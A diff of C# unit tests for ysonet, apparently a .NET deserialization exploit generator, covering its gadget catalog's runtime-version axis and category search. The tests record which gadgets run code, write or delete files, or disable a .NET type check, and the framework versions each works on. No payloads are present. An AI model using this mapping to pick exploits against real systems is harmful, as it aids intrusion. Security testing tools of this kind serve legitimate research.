                     AssertTrue(Array.IndexOf(vocab, gone) < 0, "removed value '" + gone + "' is absent");
         }
 
+        // The version axis is the one axis that carries exact numbers, so it has its
+        // own vocabulary rules: ordered oldest-first inside each family, unique,
+        // labelled, and using "unspecified" (not "uncategorized") for no evidence.
+        private static void VersionVocabularyIsOrderedAndValid()
+        {
+            var seen = new HashSet<string>(StringComparer.Ordinal);
+            foreach (string v in RuntimeVersion.All)
+            {
+                AssertTrue(!string.IsNullOrEmpty(v), "no empty version value");
+                AssertTrue(seen.Add(v), "version value '" + v + "' is unique");
+                AssertTrue(!string.IsNullOrEmpty(GadgetFacetReader.Label(v)), "version '" + v + "' has a label");
+            }
+            AssertTrue(seen.Contains(RuntimeVersion.Unspecified), "the axis has an unspecified value");
+            AssertTrue(seen.Contains(RuntimeVersion.Other), "the axis has an other value");
+            AssertTrue(!seen.Contains("uncategorized"), "the version axis uses 'unspecified', not 'uncategorized'");
+            AssertEqual(RuntimeVersion.Unspecified, GadgetFacetReader.NoEvidenceValueFor(CategoryAxis.Version),
+                "the version axis reports unspecified as its no-evidence value");
+            AssertEqual("uncategorized", GadgetFacetReader.NoEvidenceValueFor(CategoryAxis.Kind),
+                "the broad axes still report uncategorized");
+
+            // Each family must be contiguous and ascending, because Range() slices
+            // this array and the display sorts by position in it.
+            AssertTrue(RuntimeVersion.IndexOf(RuntimeVersion.NetFx20) < RuntimeVersion.IndexOf(RuntimeVersion.NetFx481),
+                "framework versions ascend");
+            AssertTrue(RuntimeVersion.IndexOf(RuntimeVersion.NetFx481) < RuntimeVersion.IndexOf(RuntimeVersion.Net50),
+                ".NET Framework precedes modern .NET");
+            AssertTrue(RuntimeVersion.IndexOf(RuntimeVersion.Net90) < RuntimeVersion.IndexOf(RuntimeVersion.Net100),
+                ".NET 10.0 sorts after 9.0, not between 1.0 and 2.0");
+            AssertEqual(".NET Framework 4.8.1", GadgetFacetReader.Label(RuntimeVersion.NetFx481), "framework label");
+            AssertEqual(".NET 5.0", GadgetFacetReader.Label(RuntimeVersion.Net50), "modern label");
+            AssertEqual("Mono", GadgetFacetReader.Label(RuntimeVersion.Mono), "mono label");
+            AssertEqual("net-framework", GadgetRequirement.NetFramework,
+                "the requirement value is distinct from the version tokens");
+            AssertEqual(".NET Framework", GadgetFacetReader.Label(GadgetRequirement.NetFramework),
+                "the net-framework requirement keeps its own label");
+        }
+
+        private static void VersionRangeExpandsAndGuards()
+        {
+            string[] span = RuntimeVersion.Range(RuntimeVersion.NetFx48, RuntimeVersion.NetFx481);
+            AssertSetEqual(new List<string>(span), new[] { RuntimeVersion.NetFx48, RuntimeVersion.NetFx481 },
+                "a two-version range expands inclusively");
+            AssertSetEqual(new List<string>(RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx461)),
+                new[] { RuntimeVersion.NetFx45, RuntimeVersion.NetFx451, RuntimeVersion.NetFx452,
+                        RuntimeVersion.NetFx46, RuntimeVersion.NetFx461 },
+                "4.5 to 4.6.1 covers every servicing version in between");
+            AssertEqual(1, RuntimeVersion.Range(RuntimeVersion.Net50, RuntimeVersion.Net50).Length,
+                "a single-version range is allowed");
+
+            AssertThrows(() => RuntimeVersion.Range(RuntimeVersion.NetFx481, RuntimeVersion.Net50),
+                "a range cannot cross runtime families");
+            AssertThrows(() => RuntimeVersion.Range(RuntimeVersion.NetFx481, RuntimeVersion.NetFx48),
+                "a reversed range is rejected");
+            AssertThrows(() => RuntimeVersion.Range("net-fx-4.9", RuntimeVersion.NetFx481),
+                "an unknown version is rejected");
+            AssertThrows(() => RuntimeVersion.Range(RuntimeVersion.Unspecified, RuntimeVersion.NetFx48),
+                "unspecified is not a range endpoint");
+        }
+
+        private static void VersionResolveAcceptsUserForms()
+        {
+            AssertEqual(RuntimeVersion.NetFx481, RuntimeVersion.Resolve("net-fx-4.8.1"), "canonical token");
+            AssertEqual(RuntimeVersion.NetFx481, RuntimeVersion.Resolve("4.8.1"), "a bare number means .NET Framework");
+            AssertEqual(RuntimeVersion.NetFx48, RuntimeVersion.Resolve(".NET 4.8"), "dotted family word");
+            AssertEqual(RuntimeVersion.NetFx48, RuntimeVersion.Resolve("Framework 4.8"), "the word framework");
+            AssertEqual(RuntimeVersion.Net50, RuntimeVersion.Resolve("net5.0"), "modern short form");
+            AssertEqual(RuntimeVersion.Net50, RuntimeVersion.Resolve("5.0"), "a bare number with no framework build");
+            AssertEqual(RuntimeVersion.Mono, RuntimeVersion.Resolve("MONO"), "case-insensitive");
+            AssertTrue(RuntimeVersion.Resolve("4.9") == null, "a version that never existed does not resolve");
+            AssertTrue(RuntimeVersion.Resolve("") == null, "empty does not resolve");
+        }
+
+        // Evidence rule: a gadget only names runtime versions when the repo actually
+        // establishes them. Everything else stays "unspecified" rather than
+        // inheriting a comfortable-looking default.
+        private static void VersionSupportIsEvidenced()
+        {
+            // ActivitySurrogateDisableTypeCheck exists to switch off the 4.8+ type
+            // check, and its variant override must repeat the same support.
+            foreach (int variant in new[] { 1, 2 })
+                AssertSetEqual(CapVersions("ActivitySurrogateDisableTypeCheck", variant),
+                    new[] { RuntimeVersion.NetFx48, RuntimeVersion.NetFx481 },
+                    "ActivitySurrogateDisableTypeCheck variant " + variant + " is a 4.8+ payload");
+
+            AssertSetEqual(CapVersions("BaseActivationFactory", null),
+                new[] { RuntimeVersion.Net50, RuntimeVersion.Net60, RuntimeVersion.Net70 },
+                "BaseActivationFactory is documented for .NET 5/6/7");
+
+            AssertSetEqual(CapVersions("TypeConfuseDelegateMono", null),
+                new[] { RuntimeVersion.Mono }, "the Mono variant is recorded on Mono");
+
+            // Earned by the FULL suite: the ceiling is the build the payload fired on
+            // (see RuntimeBuild), the floor is where the chain's types are documented.
+            AssertSetEqual(CapVersions("TypeConfuseDelegate", 1),
+                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481),
+                "TypeConfuseDelegate starts at the 4.5-era ComparisonComparer");
+            AssertSetEqual(CapVersions("DataSet", null),
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481),
+                "a carrier with no 4.5-only type starts at the CLR v4 floor");
+            AssertSetEqual(CapVersions("PSObject", null),
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481),
+                "PSObject fired here with its bundled assembly; the CVE-2017-8565 patch "
+                + "gate is a separate fact and stays in AdditionalInfo");
+
+            // A gadget the suite never fires, and whose documented support is only
+            // partial, must still say nothing rather than borrow a range.
+            AssertSetEqual(CapVersions("GetterCompilerResults", 1),
+                new[] { RuntimeVersion.Unspecified },
+                "no reproduction and only partial documentation stays unspecified");
+
+            // Nothing may pair a real version with "unspecified" anywhere.
+            foreach (GadgetCapability c in GadgetFacetReader.ExpandAll())
+            {
+                AssertTrue(c.Versions.Count > 0, c.GadgetName + " has a version value");
+                if (c.Versions.Count > 1)
+                    AssertTrue(!c.Versions.Contains(RuntimeVersion.Unspecified),
+                        c.GadgetName + " does not mix unspecified with a real version");
+            }
+        }
+
+        // A variant FacetOverride replaces the WHOLE set, so it is easy to restate the
+        // requirements and silently drop the versions the gadget had declared - the
+        // variant then reads as "no evidence" while its siblings claim a range. Caught
+        // this on ObjectDataProvider v3 and ResourceSet v2 when the axis was first
+        // filled in, so it is worth a standing check rather than a comment.
+        private static void VariantOverridesKeepTheirVersions()
+        {
+            foreach (string name in CliListing.Gadgets())
+            {
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                if (g == null)
+                    continue;
+
+                bool anyReal = false, anyMissing = false;
+                foreach (GadgetCapability c in GadgetFacetReader.Expand(g))
+                {
+                    if (c.Versions.Contains(RuntimeVersion.Unspecified))
+                        anyMissing = true;
+                    else
+                        anyReal = true;
+                }
+                AssertTrue(!(anyReal && anyMissing), name + ": some variants declare runtime versions "
+                    + "and others do not. A FacetOverride replaces the whole set, so repeat the range "
+                    + "in the override (or leave the whole gadget unspecified).");
+            }
+        }
+
+        private static void VersionSummaryCollapsesRanges()
+        {
+            AssertEqual(".NET Framework 2.0 - 4.7.2",
+                GadgetFacetReader.VersionSummary(RuntimeVersion.Range(RuntimeVersion.NetFx20, RuntimeVersion.NetFx472)),
+                "a contiguous framework span renders as one range");
+            AssertEqual(".NET 5.0 - 7.0",
+                GadgetFacetReader.VersionSummary(RuntimeVersion.Range(RuntimeVersion.Net50, RuntimeVersion.Net70)),
+                "a contiguous modern span renders as one range");
+            AssertEqual(".NET Framework 4.8.1",
+                GadgetFacetReader.VersionSummary(new List<string> { RuntimeVersion.NetFx481 }),
+                "a single version renders alone");
+            AssertEqual("Unspecified",
+                GadgetFacetReader.VersionSummary(new List<string> { RuntimeVersion.Unspecified }),
+                "no evidence renders as Unspecified");
+            AssertEqual(".NET Framework 4.5, .NET Framework 4.8 - 4.8.1",
+                GadgetFacetReader.VersionSummary(new List<string>
+                    { RuntimeVersion.NetFx481, RuntimeVersion.NetFx45, RuntimeVersion.NetFx48 }),
+                "a gap splits the summary into separate runs");
+            // A family boundary is never collapsed, even though the tokens are adjacent.
+            AssertEqual(".NET Framework 4.8.1, .NET 5.0",
+                GadgetFacetReader.VersionSummary(new List<string> { RuntimeVersion.NetFx481, RuntimeVersion.Net50 }),
+                "adjacent tokens in different families stay separate");
+        }
+
         private static void EveryGadgetExpandsToCapabilities()
         {
             var all = GadgetFacetReader.ExpandAll();
@@ -5253,6 +10028,7 @@ namespace ysonet.Tests
                     AssertTrue(c.Kinds.Count > 0, name + " has a kind");
                     AssertTrue(c.Inputs.Count > 0, name + " has an accepted input");
                     AssertTrue(c.Requirements.Count > 0, name + " has requirements");
+                    AssertTrue(c.Versions.Count > 0, name + " has a runtime version value");
                     AssertTrue(c.Formatters.Count > 0, name + " has formatter tokens");
                 }
             }
@@ -5263,12 +10039,15 @@ namespace ysonet.Tests
             var def = new GadgetFacetSet();
             AssertSetEqual(def.Kinds, new[] { "uncategorized" }, "default kind is uncategorized");
             AssertSetEqual(def.Requirements, new[] { "uncategorized" }, "default requirements are uncategorized");
+            AssertSetEqual(def.Versions, new[] { RuntimeVersion.Unspecified }, "default versions are unspecified");
             AssertTrue(def.Inputs == null, "default inputs are null (derive from CommandInputType)");
 
             var cap = GadgetFacetReader.BuildCapability("X", null, null, new GadgetFacetSet(),
                 CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" });
             AssertSetEqual(cap.Kinds, new[] { "uncategorized" }, "default kind normalizes to uncategorized");
             AssertSetEqual(cap.Inputs, new[] { PayloadInput.Command }, "shell command derives to command");
+            AssertSetEqual(cap.Versions, new[] { RuntimeVersion.Unspecified },
+                "default versions normalize to unspecified");
         }
 
         private static void InputDerivationCoversCommandInputTypes()
@@ -5278,7 +10057,18 @@ namespace ysonet.Tests
             AssertEqual(PayloadInput.AssemblyFile, GadgetFacetReader.DeriveInput(CommandInputType.DllPath), "dll->assembly-file");
             AssertEqual(PayloadInput.RemoteUrl, GadgetFacetReader.DeriveInput(CommandInputType.Url), "url->remote-url");
             AssertEqual(PayloadInput.LocalFile, GadgetFacetReader.DeriveInput(CommandInputType.FilePath), "file->local-file");
+            AssertEqual(PayloadInput.TargetPath, GadgetFacetReader.DeriveInput(CommandInputType.TargetPath), "target path->target-path");
+            AssertEqual(PayloadInput.TargetPath, GadgetFacetReader.DeriveInput(CommandInputType.TargetPathPair), "target path pair->target-path");
+            // A single derived value cannot say "both", so the target path wins and the
+            // write variant declares WithInputs(target-path, local-file) explicitly.
+            AssertEqual(PayloadInput.TargetPath, GadgetFacetReader.DeriveInput(CommandInputType.TargetPathAndLocalFile), "target path + local file->target-path");
             AssertEqual(PayloadInput.None, GadgetFacetReader.DeriveInput(CommandInputType.Ignored), "ignored->none");
+
+            // Every enum member must have its own derivation: a new input type that is not
+            // mapped would silently fall through to "uncategorized".
+            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
+                AssertTrue(GadgetFacetReader.DeriveInput(t) != PayloadInput.Uncategorized,
+                    "CommandInputType." + t + " derives a real accepted-input value");
         }
 
         private static void ExplicitInputsReplaceDerivedInput()
@@ -5306,6 +10096,16 @@ namespace ysonet.Tests
                 new GadgetFacetSet().WithInputs(PayloadInput.Uncategorized, PayloadInput.Command),
                 CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
                 "uncategorized mixed with a real input is rejected");
+
+            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
+                new GadgetFacetSet().WithVersions(RuntimeVersion.Unspecified, RuntimeVersion.NetFx48),
+                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
+                "unspecified mixed with a real version is rejected");
+
+            AssertThrows(() => GadgetFacetReader.BuildCapability("X", null, null,
+                new GadgetFacetSet().WithVersions("net-fx-9.9"),
+                CommandInputType.ShellCommand, new List<string> { "BinaryFormatter" }),
+                "an unknown version value is rejected");
         }
 
         private static void VariantFacetInheritanceAndOverride()
@@ -5379,64 +10179,134 @@ namespace ysonet.Tests
         {
             // Lock representative units so a future edit that silently changes a
             // gadget's broad category fails loudly.
-            AssertCap("TypeConfuseDelegate", null,
-                new[] { PayloadKind.CodeExecution },
-                new[] { PayloadInput.Command },
-                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework });
+            // TypeConfuseDelegate's three variants only swap the serialized root container
+            // (SortedSet / SortedDictionary / TreeSet). The capability is identical for all
+            // three: it runs a command with framework built-in types, so none declares a
+            // facet override.
+            // The version row is part of the lock: all three variants share the 4.5-era
+            // ComparisonComparer floor and the 4.8.1 ceiling the FULL suite fired them on.
+            for (int v = 1; v <= 3; v++)
+                AssertCap("TypeConfuseDelegate", v,
+                    new[] { PayloadKind.CodeExecution },
+                    new[] { PayloadInput.Command },
+                    new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                    RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
+
+            // TypeConfuseDelegateFileOperations shares the primitive but not the payload
+            // kind: it is file-system, not code-execution, and its input is a TARGET path
+            // rather than a command. Variant 1 (write) is the only one that also names a
+            // file on the operator machine, so it is the only one with a facet override -
+            // and that override repeats the same kind, requirements and versions, because
+            // an override replaces the whole set.
+            AssertCap(FileOpsGadget, 1,
+                new[] { PayloadKind.FileSystem },
+                new[] { PayloadInput.TargetPath, PayloadInput.LocalFile },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
+
+            for (int v = 2; v <= 5; v++)
+                AssertCap(FileOpsGadget, v,
+                    new[] { PayloadKind.FileSystem },
+                    new[] { PayloadInput.TargetPath },
+                    new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                    RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
+
+            // The gadget FileLogTraceListener was migrated off the local-file input type
+            // for the same distinction: its -c is a directory the target creates.
+            AssertCap("FileLogTraceListener", null,
+                new[] { PayloadKind.FileSystem },
+                new[] { PayloadInput.TargetPath },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
+
+            // TempFileCollection is the third file-system gadget and the only one that
+            // DELETES. It declares its inputs explicitly rather than deriving them, because
+            // File.Delete takes a UNC path as readily as a local one, so unc-path is a real
+            // accepted form and not just a target path that happens to start with two
+            // backslashes. No variants, so the single unit carries the whole claim. Its floor
+            // is the CLR v4 default (nothing in the chain is 4.5-only) and its ceiling is the
+            // build the FULL suite deleted a file on.
+            AssertCap(TempFilesGadget, null,
+                new[] { PayloadKind.FileSystem },
+                new[] { PayloadInput.TargetPath, PayloadInput.UncPath },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
 
             AssertCap("WindowsClaimsIdentity", 1,
                 new[] { PayloadKind.NestedDeserialization },
                 new[] { PayloadInput.Command },
-                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework });
+                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
 
             AssertCap("ObjRef", null,
                 new[] { PayloadKind.Network },
                 new[] { PayloadInput.RemoteUrl },
-                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework });
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
 
             AssertCap("DataSetOldBehaviourFromFile", 1,
                 new[] { PayloadKind.CodeExecution },
                 new[] { PayloadInput.SourceCodeFile },
-                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework });
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
 
             // DataTable is a same-graph root carrier, NOT a nested-BinaryFormatter sink
             // like DataSet: its complete payload runs code via the inner gadget. Variant 1
             // (default, TextFormattingRunProperties) is code-execution with an
             // extra-assembly + WPF requirement and no BuiltIn; this locks the distinction
             // from DataSet, which is easy to regress toward. Variant 2 (TypeConfuseDelegate)
-            // is code-execution and framework built-in (no WPF, no extra assembly).
+            // is code-execution and framework built-in (no WPF, no extra assembly). The
+            // two variants also differ on versions: only variant 2 carries the 4.5-era
+            // TypeConfuseDelegate inner.
             AssertCap("DataTable", 1,
                 new[] { PayloadKind.CodeExecution },
                 new[] { PayloadInput.Command },
-                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework });
+                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
 
             AssertCap("DataTable", 2,
                 new[] { PayloadKind.CodeExecution },
                 new[] { PayloadInput.Command },
-                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework });
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework },
+                RuntimeVersion.Range(RuntimeVersion.NetFx45, RuntimeVersion.NetFx481));
 
             AssertCap("XamlImageInfo", 1,
                 new[] { PayloadKind.NestedDeserialization },
                 new[] { PayloadInput.LocalFile, PayloadInput.UncPath },
-                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework });
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
+                NoVersionEvidence);
 
             AssertCap("XamlImageInfo", 2,
                 new[] { PayloadKind.CodeExecution, PayloadKind.NestedDeserialization },
                 new[] { PayloadInput.Command },
-                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework });
+                new[] { GadgetRequirement.ExtraAssembly, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
+                NoVersionEvidence);
+
+            // XamlImageInfo is the audited gadget the execution matrix never fires (its
+            // effect is a nested parse, not a sink the tests own), so it has no version
+            // evidence and must keep saying so.
+            // The narrowest version claim in the catalog: this payload exists to switch
+            // off the 4.8+ ActivitySurrogateSelector type check.
+            AssertCap("ActivitySurrogateDisableTypeCheck", 1,
+                new[] { PayloadKind.Other },
+                new[] { PayloadInput.None },
+                new[] { GadgetRequirement.BuiltIn, GadgetRequirement.Wpf, GadgetRequirement.NetFramework },
+                new[] { RuntimeVersion.NetFx48, RuntimeVersion.NetFx481 });
         }
 
         private static void CategoryQueryParsesAllAxes()
         {
             GadgetCategoryQuery q; string err;
             bool ok = GadgetCategoryQuery.TryParse(
-                new[] { "KIND=Code-Execution", "formatter=json.net", "input=UNC-PATH", "Requirement=extra-assembly" },
+                new[] { "KIND=Code-Execution", "formatter=json.net", "input=UNC-PATH", "Requirement=extra-assembly",
+                        "VERSION=4.8.1" },
                 out q, out err);
             AssertTrue(ok, "valid axes parse: " + err);
             AssertTrue(q.Kinds.Contains(PayloadKind.CodeExecution), "kind parsed case-insensitively");
             AssertTrue(q.Formatters.Contains("Json.NET"), "formatter canonicalized to Json.NET");
             AssertTrue(q.Inputs.Contains(PayloadInput.UncPath), "input parsed");
             AssertTrue(q.Requirements.Contains(GadgetRequirement.ExtraAssembly), "requirement parsed");
+            AssertTrue(q.Versions.Contains(RuntimeVersion.NetFx481), "a bare version number canonicalizes");
         }
 
         private static void CategoryQueryRejectsMalformedValues()
@@ -5445,10 +10315,14 @@ namespace ysonet.Tests
             AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "" }, out q, out err), "empty rejected");
             AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "kindcodeexec" }, out q, out err), "missing = rejected");
             AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "foo=bar" }, out q, out err), "unknown axis rejected");
-            AssertTrue(err.Contains("kind") && err.Contains("formatter"), "axis error lists valid axes");
+            AssertTrue(err.Contains("kind") && err.Contains("formatter") && err.Contains("version"),
+                "axis error lists valid axes");
             AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "kind=banana" }, out q, out err), "unknown kind rejected");
             AssertTrue(err.Contains(PayloadKind.CodeExecution), "value error lists valid values");
             AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "formatter=NoSuchFmt" }, out q, out err), "unknown formatter rejected");
+            AssertTrue(!GadgetCategoryQuery.TryParse(new[] { "version=4.9" }, out q, out err),
+                "a version that never shipped is rejected");
+            AssertTrue(err.Contains(RuntimeVersion.NetFx481), "version error lists valid versions");
         }
 
         private static void CategoryQueryCombinesSelections()
@@ -5514,10 +10388,18 @@ namespace ysonet.Tests
             AssertTrue(outText.Contains("(*) ObjRef"), "matching gadget printed to stdout");
             AssertTrue(outText.Contains("Kind: Network"), "matching unit is detailed");
 
-            // No-match search: a valid but unused vocabulary value.
-            var dosQ = new GadgetCategoryQuery();
-            dosQ.Add(CategoryAxis.Kind, PayloadKind.DenialOfService);
-            code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(dosQ), out outText, out errText);
+            // Non-RCE search: the converted FileLogTraceListener gadget is discoverable.
+            var fsQ = new GadgetCategoryQuery();
+            fsQ.Add(CategoryAxis.Kind, PayloadKind.FileSystem);
+            code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(fsQ), out outText, out errText);
+            AssertEqual(0, code, "the file-system search exits 0");
+            AssertTrue(outText.Contains("(*) FileLogTraceListener"),
+                "the non-RCE FileLogTraceListener gadget is printed");
+
+            // No-match search: a valid but currently unused vocabulary value.
+            var disclosureQ = new GadgetCategoryQuery();
+            disclosureQ.Add(CategoryAxis.Kind, PayloadKind.InformationDisclosure);
+            code = CaptureConsole(() => GadgetCategoryCommand.RunHumanSearch(disclosureQ), out outText, out errText);
             AssertEqual(1, code, "a no-match search exits 1");
             AssertTrue(string.IsNullOrEmpty(outText.Trim()), "no-match leaves stdout empty");
             AssertTrue(errText.Contains("No gadgets match"), "no-match explanation on stderr");
@@ -5534,7 +10416,12 @@ namespace ysonet.Tests
             AssertEqual(0, exit, "standalone search exits 0");
             AssertTrue(so.Contains("(*) TypeConfuseDelegate"), "standalone search prints matches to stdout");
 
-            TryRunYsonet("--category=kind=denial-of-service", out exit, out so, out se);
+            TryRunYsonet("--category=kind=file-system", out exit, out so, out se);
+            AssertEqual(0, exit, "non-RCE search exits 0");
+            AssertTrue(so.Contains("(*) FileLogTraceListener"),
+                "non-RCE search prints FileLogTraceListener");
+
+            TryRunYsonet("--category=kind=information-disclosure", out exit, out so, out se);
             AssertEqual(1, exit, "no-match search exits 1");
 
             TryRunYsonet("--category=bad=x", out exit, out so, out se);
@@ -5631,7 +10518,9 @@ namespace ysonet.Tests
             applied.Add(CategoryAxis.Kind, PayloadKind.CodeExecution);
             var model = CategoryFilterModel.Load(applied);
             var keys = new ScriptedKeyReader();
-            keys.Down().Down().Down().Down().Down(); // focus -> [ Clear all ] (row 5)
+            // Rows: Show(0), one row per axis, then [ Clear all ]. Walk down by the
+            // axis count so a new axis does not silently retarget this test.
+            for (int i = 0; i < CategoryFilterModel.Axes.Length + 1; i++) keys.Down();
             keys.Enter();                            // clear all
             keys.Escape();                           // exit
             var filter = new CategoryFilter(keys, model);
@@ -5644,12 +10533,14 @@ namespace ysonet.Tests
             var applied = new GadgetCategoryQuery();
             applied.Add(CategoryAxis.Kind, PayloadKind.Network);
             var model = CategoryFilterModel.Load(applied);
-            AssertEqual(0, model.CountForValue(CategoryAxis.Requirement, GadgetRequirement.ExtraAssembly),
-                "no network gadget needs an extra assembly");
+            AssertEqual(1, model.CountForValue(CategoryAxis.Requirement, GadgetRequirement.ExtraAssembly),
+                "InfiniteProgressPage is the network gadget that needs an extra assembly");
+            AssertEqual(0, model.CountForValue(CategoryAxis.Requirement, GadgetRequirement.ModernDotNet),
+                "no network gadget needs modern .NET");
 
             var reqValues = model.ValuesForAxis(CategoryAxis.Requirement);
-            int idx = reqValues.IndexOf(GadgetRequirement.ExtraAssembly);
-            AssertTrue(idx >= 0, "extra-assembly is a catalog value");
+            int idx = reqValues.IndexOf(GadgetRequirement.ModernDotNet);
+            AssertTrue(idx >= 0, "modern-dotnet is a catalog value");
 
             var keys = new ScriptedKeyReader();
             keys.Down().Down().Down().Down();  // focus -> Requirements (row 4)
@@ -5795,14 +10686,31 @@ namespace ysonet.Tests
             return null;
         }
 
-        private static void AssertCap(string gadget, int? variant, string[] kinds, string[] inputs, string[] requirements)
+        // The declared versions of one capability unit, with a readable failure when
+        // the unit does not exist (a wrong variant number otherwise surfaces as a bare
+        // NullReferenceException in whichever test looked it up).
+        private static List<string> CapVersions(string gadget, int? variant)
+        {
+            GadgetCapability c = FindCap(gadget, variant);
+            AssertTrue(c != null, gadget + (variant.HasValue ? (" variant " + variant) : " (no variant)")
+                + " expands to a capability unit");
+            return c == null ? new List<string>() : c.Versions;
+        }
+
+        private static void AssertCap(string gadget, int? variant, string[] kinds, string[] inputs,
+            string[] requirements, string[] versions)
         {
             var c = FindCap(gadget, variant);
             AssertTrue(c != null, gadget + (variant.HasValue ? (" variant " + variant) : "") + " expands");
             AssertSetEqual(c.Kinds, kinds, gadget + " kinds");
             AssertSetEqual(c.Inputs, inputs, gadget + " inputs");
             AssertSetEqual(c.Requirements, requirements, gadget + " requirements");
+            AssertSetEqual(c.Versions, versions, gadget + " runtime versions");
         }
+
+        // Most audited gadgets have no recorded runtime version, so name that once
+        // instead of repeating the literal in every row.
+        private static readonly string[] NoVersionEvidence = { RuntimeVersion.Unspecified };
 
         private static void AssertSetEqual(List<string> actual, string[] expected, string msg)
         {
